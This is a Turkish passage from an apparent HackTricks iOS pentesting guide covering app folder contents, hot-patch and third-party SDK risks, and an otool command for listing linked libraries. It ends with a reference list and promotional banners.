* Yüklenmiş bir uygulamanın klasörü içinde (**`/User/Applications/<APP ID>/`**) bazı ilginç dosyalar bulabilirsiniz:
  * **`iTunesArtwork`**: Uygulama tarafından kullanılan simge
  * **`iTunesMetadata.plist`**: App Store'da kullanılan uygulama bilgileri
  * **`/Library/*`**: Tercihleri ve önbelleği içerir. **`/Library/Cache/Snapshots/*`** içinde, uygulamanın arka plana gönderilmeden önce yapılan anlık görüntüleri bulabilirsiniz.

### Sıcak Yama/Zorunlu Güncelleme

Geliştiriciler, uygulamalarının tüm yüklemelerini **anında uzaktan yamalayabilir** ve uygulamayı App Store'a yeniden gönderip onaylanmasını beklemek zorunda kalmazlar.\
Bu amaçla genellikle [**JSPatch**](https://github.com/bang590/JSPatch) gibi araçlar kullanılır. Ancak [Siren](https://github.com/ArtSabintsev/Siren) ve [react-native-appstore-version-checker](https://www.npmjs.com/package/react-native-appstore-version-checker) gibi diğer seçenekler de mevcuttur.\
**Bu, kötü niyetli üçüncü taraf SDK'ları tarafından kötüye kullanılabilecek tehlikeli bir mekanizmadır, bu nedenle otomatik güncelleme için hangi yöntemin kullanıldığını kontrol etmeniz ve test etmeniz önerilir.** Bu amaçla uygulamanın önceki bir sürümünü indirmeyi deneyebilirsiniz.

### Üçüncü Taraflar

**3. taraf SDK'ları** ile önemli bir zorluk, işlevsellikleri üzerinde **ayrıntılı kontrol eksikliğidir**. Geliştiriciler, ya SDK'yı entegre eder ve potansiyel güvenlik açıkları ve gizlilik endişeleri de dahil olmak üzere tüm özelliklerini kabul eder ya da tamamen faydalarından vazgeçer. Genellikle, geliştiriciler bu SDK'ların içindeki güvenlik açıklarını kendileri yamayamazlar. Ayrıca, SDK'lar topluluk içinde güven kazandıkça, bazıları kötü amaçlı yazılım içerebilir.

Üçüncü taraf SDK'ların sağladığı hizmetler arasında kullanıcı davranışlarını izleme, reklam gösterimi veya kullanıcı deneyimi iyileştirmeleri bulunabilir. Ancak, bu, geliştiricilerin bu kütüphaneler tarafından yürütülen kodun tam olarak farkında olmamalarına ve potansiyel gizlilik ve güvenlik risklerine yol açabilir. Üçüncü taraf hizmetlerle paylaşılan bilgilerin sınırlı olması ve hassas verilerin açığa çıkarılmamasının sağlanması önemlidir.

Uygulamanın kullandığı kütüphaneleri belirlemek için **`otool`** komutu kullanılabilir. Bu araç, uygulama ve kullandığı her paylaşılan kütüphane üzerinde çalıştırılmalıdır, böylece ek kütüphaneler keşfedilebilir.
```bash
otool -L <application_path>
```
## **Referanslar ve Daha Fazla Kaynak**

* [https://mobile-security.gitbook.io/mobile-security-testing-guide/ios-testing-guide/0x06b-basic-security-testing#information-gathering](https://mobile-security.gitbook.io/mobile-security-testing-guide/ios-testing-guide/0x06b-basic-security-testing#information-gathering)
* [iOS & Mobil Uygulama Pentesting - INE](https://my.ine.com/CyberSecurity/courses/089d060b/ios-mobile-app-pentesting)
* [https://mas.owasp.org/MASTG/techniques/ios/MASTG-TECH-0057/](https://mas.owasp.org/MASTG/techniques/ios/MASTG-TECH-0057/)
* [https://mas.owasp.org/MASTG/techniques/ios/MASTG-TECH-0058/](https://mas.owasp.org/MASTG/techniques/ios/MASTG-TECH-0058/)
* [https://mas.owasp.org/MASTG/techniques/ios/MASTG-TECH-0059/](https://mas.owasp.org/MASTG/techniques/ios/MASTG-TECH-0059/)
* [https://mas.owasp.org/MASTG/iOS/0x06d-Testing-Data-Storage](https://mas.owasp.org/MASTG/iOS/0x06d-Testing-Data-Storage)
* [https://coderwall.com/p/kjb3lw/storing-password-in-keychain-the-smart-way](https://coderwall.com/p/kjb3lw/storing-password-in-keychain-the-smart-way)
* [https://mas.owasp.org/MASTG/tests/ios/MASVS-STORAGE/MASTG-TEST-0055/](https://mas.owasp.org/MASTG/tests/ios/MASVS-STORAGE/MASTG-TEST-0055/)
* [https://mas.owasp.org/MASTG/tests/ios/MASVS-STORAGE/MASTG-TEST-0053](https://mas.owasp.org/MASTG/tests/ios/MASVS-STORAGE/MASTG-TEST-0053)
* [https://mas.owasp.org/MASTG/techniques/ios/MASTG-TECH-0060/](https://mas.owasp.org/MASTG/techniques/ios/MASTG-TECH-0060/)
* [https://mas.owasp.org/MASTG/tests/ios/MASVS-STORAGE/MASTG-TEST-0058](https://mas.owasp.org/MASTG/tests/ios/MASVS-STORAGE/MASTG-TEST-0058)
* [https://mas.owasp.org/MASTG/tests/ios/MASVS-STORAGE/MASTG-TEST-0060](https://mas.owasp.org/MASTG/tests/ios/MASVS-STORAGE/MASTG-TEST-0060)
* [https://mas.owasp.org/MASTG/Android/0x05f-Testing-Local-Authentication/](https://mas.owasp.org/MASTG/Android/0x05f-Testing-Local-Authentication/)
* [https://mas.owasp.org/MASTG/tests/ios/MASVS-AUTH/MASTG-TEST-0064](https://mas.owasp.org/MASTG/tests/ios/MASVS-AUTH/MASTG-TEST-0064)
* [https://medium.com/securing/bypassing-your-apps-biometric-checks-on-ios-c2555c81a2dc](https://medium.com/securing/bypassing-your-apps-biometric-checks-on-ios-c2555c81a2dc)
* [https://mas.owasp.org/MASTG/tests/ios/MASVS-STORAGE/MASTG-TEST-0054](https://mas.owasp.org/MASTG/tests/ios/MASVS-STORAGE/MASTG-TEST-0054)
* [https://github.com/ivRodriguezCA/RE-iOS-Apps/](https://github.com/ivRodriguezCA/RE-iOS-Apps/) IOS ücretsiz kurs([https://syrion.me/blog/ios-swift-antijailbreak-bypass-frida/](https://syrion.me/blog/ios-swift-antijailbreak-bypass-frida/))
* [https://www.sans.org/reading-room/whitepapers/testing/ipwn-apps-pentesting-ios-applications-34577](https://www.sans.org/reading-room/whitepapers/testing/ipwn-apps-pentesting-ios-applications-34577)
* [https://www.slideshare.net/RyanISI/ios-appsecurityminicourse](https://www.slideshare.net/RyanISI/ios-appsecurityminicourse)
* [https://github.com/prateek147/DVIA](https://github.com/prateek147/DVIA)
* [https://github.com/prateek147/DVIA-v2](https://github.com/prateek147/DVIA-v2)
* [https://github.com/OWASP/MSTG-Hacking-Playground%20](https://github.com/OWASP/MSTG-Hacking-Playground)
* OWASP iGoat [_https://github.com/OWASP/igoat_](https://github.com/OWASP/igoat) <<< Objective-C versiyonu [_https://github.com/OWASP/iGoat-Swift_](https://github.com/OWASP/iGoat-Swift) <<< Swift versiyonu
* [https://github.com/authenticationfailure/WheresMyBrowser.iOS](https://github.com/authenticationfailure/WheresMyBrowser.iOS)
* [https://github.com/nabla-c0d3/ssl-kill-switch2](https://github.com/nabla-c0d3/ssl-kill-switch2)

<figure><img src="../../.gitbook/assets/image (3) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

\
[**Trickest**](https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks) kullanarak dünyanın en gelişmiş topluluk araçlarıyla desteklenen **otomatik iş akışları** oluşturun ve otomatikleştirin.\
Bugün Erişim Alın:

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}

<details>

<summary><strong>Sıfırdan kahraman olacak şekilde AWS hackleme öğrenin</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

HackTricks'ı desteklemenin diğer yolları:

* **Şirketinizi HackTricks'te reklamını görmek istiyorsanız** veya **HackTricks'i PDF olarak indirmek istiyorsanız** [**ABONELİK PLANLARI**](https://github.com/sponsors/carlospolop)'na göz atın!
* [**Resmi PEASS & HackTricks ürünlerine göz atın**](https://peass.creator-spring.com)
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family) koleksiyonumuzdaki özel [**NFT'leri**](https://opensea.io/collection/the-peass-family) keşfedin
* 💬 [**Discord grubuna**](https://discord.gg/hRep4RUj7f) veya [**telegram grubuna**](https://t.me/peass) katılın veya bizi **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**'da takip edin.**
* **Hacking püf noktalarınızı göndererek HackTricks** ve [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github depolarına PR göndererek paylaşın.

</details>
